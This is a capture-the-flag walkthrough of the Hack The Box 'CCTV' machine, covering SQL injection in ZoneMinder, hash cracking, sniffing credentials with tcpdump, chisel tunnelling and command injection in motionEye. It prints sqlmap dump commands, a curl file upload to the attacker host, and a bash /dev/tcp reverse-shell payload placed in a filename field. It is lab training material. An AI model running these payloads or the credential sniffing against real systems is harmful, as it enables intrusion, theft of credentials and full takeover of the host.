# CCTV

**Target IP:** `10.129.244.156`  
**Hostname:** `cctv.htb`  
**Platform:** `Linux`  
**Difficulty:** `Easy`

---

## 1. Enumeration

### Port Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

So this seems like our classic http + ssh combo, we should start looking at the http site as they seem to be the most common exploitation.

### Web Reconnaissance

When viewing the website we are presented with the following screen - ![](Screenshots/Pasted%20image%2020260316105327.png)

We find a couple of emails while hunting around:

- info@cctv.htb
- info@securevision.com

At /zm there is a login page which is seemingly "ZoneMinder". ![](Screenshots/Pasted%20image%2020260316105837.png)

Searching online, ZoneMinder seems to be an open source bit of software to manage cameras.

At this point I can't see anything else from manually hunting around.

Directory fuzzing:

```bash
feroxbuster --url http://cctv.htb/
```

Initially when running this, we get a ton of 404 responses cluttering the stdout. We can clean this up by adding -C.

```bash
feroxbuster --url http://cctv.htb/ -C
```

The scan doesn't finish but reaches a point of saturation, with nothing new returned.

![](Screenshots/Pasted%20image%2020260316110457.png)

Interestingly, this flags a few paths in the /zm directory that might be interesting. However, when navigating to one, for example http://cctv.htb/zm/api/app/Config we get an error page leaking some of the software used.

![](Screenshots/Pasted%20image%2020260316110604.png)

CakePHP 2.10.24

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.244.156 -H "Host: FUZZ.cctv.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
```

_Note any discovered subdomains and what they reveal._

### Additional Checks

My last bit of enumeration on any bit of "off-the-shelf" software tends to be to search for any default credentials. In this case it was found to be admin / admin, which logs us into the site.

![](Screenshots/Pasted%20image%2020260316111313.png)

---

## 2. Initial Foothold — CVE-2024-51428

After logging into the site as admin, we can explore the site a bit. In the options section, there appears to be a tab named Versions, leaking the version of ZoneMinder in use - 1.37.63

![](Screenshots/Pasted%20image%2020260316115813.png)

Searching online, this seems to be vulnerable to SQL injection as described in **CVE-2024-51428**.

**Reference / PoC:** https://github.com/ben-slates/CVE-2024-51482-Multi-Stage-Surveillance-System-Exploit

### Exploitation

SQL injection is possible via the tid parameter, and can be automated exploitation using the following sqlmap command.

Confirm SQLi:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=cjhvssd6jbrn29fm6smp6svmr7" \
    -p tid --dbms=mysql --batch
```

This finds a payload that can successfully exploit a time-based blind SQLi. ![](Screenshots/Pasted%20image%2020260316140253.png)

Following the steps in the CVE, we can then dump the usernames from the db:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=cjhvssd6jbrn29fm6smp6svmr7" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump
```

![](Screenshots/Pasted%20image%2020260316140629.png)

This returns 3 users:

- admin
- mark
- superadmin

Then from this we can dump the password hash for any user, for example mark looks interesting:

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=cjhvssd6jbrn29fm6smp6svmr7" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
```

This returns a bcrypt hash. ![](Screenshots/Pasted%20image%2020260316142245.png)

---

## 3. Hash Cracking and SSH (Mark User)

Using the found bcrypt hash using the SQLi, we can attempt to crack this.

### Cracking Hash

To crack the hash, we can write it to a file and then crack it using john as follows:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

![](Screenshots/Pasted%20image%2020260316141120.png)

This drops mark's password as `opensesame`

### SSH as Mark

Now we have the username and password combination we should attempt to use these for ssh:

```bash
ssh mark@cctv.htb
```

![](Screenshots/Pasted%20image%2020260316141214.png)

And this works, but there is no user flag to be found.

---

## 4. Box Enumeration

Looking around on the box, we have two home directories - mark (which we can access) and sa_mark (which we cannot.)

Mark cannot run sudo and sa_mark exists in the /etc/passwd as a separate user: ![](Screenshots/Pasted%20image%2020260316141503.png)

I attempt to run

```bash
su sa_mark
```

With the same password as for mark, however this doesn't work.

In /opt/video/backup I find an interesting file - server.log which seems to suggest sa_mark has been authenticating to something: ![](Screenshots/Pasted%20image%2020260316141731.png)

Looking at the running services, there seems to be some interesting internal services, potentially web sites: ![](Screenshots/Pasted%20image%2020260316142138.png)

To properly view these, I am going to use chisel, allowing us to access internal services from our attacker host.

On attacker host:

```bash
chisel server --socks5 -reverse -p 8081 -v
```

On target box:

```bash
chmod +x chisel
./chisel client 10.10.14.2:8081 R:9050:socks
```

However, when trying to access the services from outside the host, it doesn't seem to work, implying perhaps they are properly locked down to localhost.

Going back to the server log we found earlier, if we wait a little while and read the file again, it seems to show sa_mark constantly authorising almost every minute.

---

## 5. Privilege Escalation — Traffic Snooping

Based on the server logs we can assume this internal web service is being used regularly by the sa_mark user, and in turn credentials are being passed to the machine we currently have access to.

If we could intercept these credentials we could gain access to the sa_mark account.

### Monitoring for Traffic

To gather some traffic into a pcap file, we can run the following command, which will generate a capture.pcap file.

```bash
tcpdump -i any -w capture.pcap
```

I then took this pcap off the target machine to my attacker machine for further analysis.

### Analysing the Traffic

To analyse the traffic I am using wireshark. I open the pcap as shown: ![](Screenshots/Pasted%20image%2020260316144831.png)

I start hunting through the tcp streams and find an interesting looking one, with what seems to be a username and password: ![](Screenshots/Pasted%20image%2020260316154149.png)

Rebuilding the stream gets the following: ![](Screenshots/Pasted%20image%2020260316154214.png)

Getting sa_mark password as `X1l9fx1ZjS7RZb`

### Escalation

We can now use this password to impersonate sa_mark

```bash
su sa_mark
```

And we can grab the user flag: ![](Screenshots/Pasted%20image%2020260316155126.png)

---

## 6. Post Exploitation Enumeration

In sa_mark's home directory there is an interesting pdf, I send this to my attacker host for further inspection:

```bash
curl 10.10.14.2:8000/upload -X POST -F "files=@SecureVision Staff Announcement.pdf"
```

![](Screenshots/Pasted%20image%2020260316155613.png)

This PDF appears to be implying there might be some internal "old" CCTV platform that we can login to using the same credentials.

At this stage I figure i need the port forwarding to work properly so I can access the site. I dig around a bit more and realise the chisel commands are not working as the service is bound to 127.0.0.1 rather than 0.0.0.0 and so can only be accessed directly. Changing the chisel command to:

```bash
./chisel client 10.10.14.2:8081 R:8765:127.0.0.1:8765
```

allows us to access this service.

When visiting this site we are presented with an old looking login screen for a bit of software called motioneye: ![](Screenshots/Pasted%20image%2020260317091359.png)

Trying the same credentials as found previously don't work for either the mark or sa_mark user.

Seemingly we are missing some credentials, so I went back to the file system and did some hunting. I eventually found an interesting folder /etc/motioneye with some credentials inside: ![](Screenshots/Pasted%20image%2020260317094147.png)

Trying this username and password combo logs us in: admin : 989c5a8ee87a0e9521ec81a79187d162109282f0 ![](Screenshots/Pasted%20image%2020260317094255.png)

In this page we can see some version numbers in the general settings: ![](Screenshots/Pasted%20image%2020260317094413.png)

---

## 7. Privilege Escalation Part 2 - CVE-2025-60787

Searching this version up online, it seems to be vulnerable to an RCE vulnerability via authenticated users.

**Reference / PoC:** https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter

We can follow the steps to execute the RCE shell.

First I setup a listener using penelope. Then I enter the following snippet into the console of the browser:

```javascript
configUiValid = function() { 
    return true; 
};
```

Then I spin up a listener and enter the payload into the image file name field in the still images setting (modifying ip address to match, to test if it works.)

```
$(curl 10.10.14.2:8000).%Y-%m-%d-%H-%M-%S
```

![](Screenshots/Pasted%20image%2020260317095552.png)

Then when we click the screenshot button, we trigger the execution and get a callback on my host: ![](Screenshots/Pasted%20image%2020260317095530.png)

Modifying our payload to be a reverse shell as follows:

```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

Again, hitting the screenshot button, we now get a shell in our listener as root, and we can grab the root flag: ![](Screenshots/Pasted%20image%2020260317095811.png)

---

## Summary

| Step                        | Technique                                                                                         |
| --------------------------- | ------------------------------------------------------------------------------------------------- |
| Initial access              | CVE-2024-51428 — SQL injection in ZoneMinder 1.37.63 via tid parameter                            |
| Credential access (mark)    | Hash cracking — bcrypt hash extracted via SQLi, cracked with john to obtain password `opensesame` |
| User shell (mark)           | SSH access as mark using cracked credentials                                                      |
| Credential access (sa_mark) | Traffic snooping via tcpdump/Wireshark to intercept sa_mark credentials from localhost service    |
| User shell (sa_mark)        | SSH access / su as sa_mark using intercepted credentials                                          |
| Privilege escalation        | CVE-2025-60787 — RCE in motionEye via authenticated command injection in image filename field     |